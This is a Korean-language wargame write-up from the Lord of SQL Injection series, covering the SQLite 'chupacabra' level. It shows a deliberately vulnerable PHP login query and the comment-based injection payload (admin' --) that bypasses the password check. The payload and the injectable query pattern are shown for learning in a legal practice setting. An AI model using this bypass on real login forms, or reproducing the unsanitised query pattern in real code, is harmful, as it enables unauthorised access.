---
title: "[Lord of SQL Injection] LoS - chupacabra 문제풀이"
date: 2019-06-18
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

오늘 부터는 두 번째 업데이트에 올라온 문제다.
이 전까지는 `DBMS`가 `MySQL`만 있었는데, 두 번째에 업데이트 된 문제는 `SQLite`, `MSSQL`, `MongoDB`를 사용하는 문제였다.
먼저 `SQLite`의 첫 번째 문제이다.  

<!--more-->

코드는 다음과 같다.  

```php
-----------------------------------------------------------------
query : select id from member where id='' and pw=''
-----------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/chupacabra.db");
  $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id'] == "admin") solve("chupacabra");
  highlight_file(__FILE__);
?>
```

첫 번째 문제라 그런지 매우 간단하다.
그냥 `id`가 `admin`인 값만 뽑아내면 된다.
가장 기본 방식인 `'`와 `--`을 사용 해 아래와 같이 문제를 풀 수있었다.  

```plain
?id=admin' -- &pw=a
```

그럼 완성되는 쿼리는 아래와 같다.  

```mysql
select id from member where id='admin' -- ' and pw='a'
```

`id='admin'` 까지만 실행하고 `--`가 삽입되며 뒤의 값은 주석처리 된다.
제일 간단한 방법으로 풀 수 있는 문제였다.  

```php
-------------------------------------------------------------------------
query : select id from member where id='admin' -- ' and pw='a'
-------------------------------------------------------------------------

CHUPACABRA Clear!
<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/chupacabra.db");
  $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id'] == "admin") solve("chupacabra");
  highlight_file(__FILE__);
?>
```

---

```plain
CHUPACABRA Clear!!
```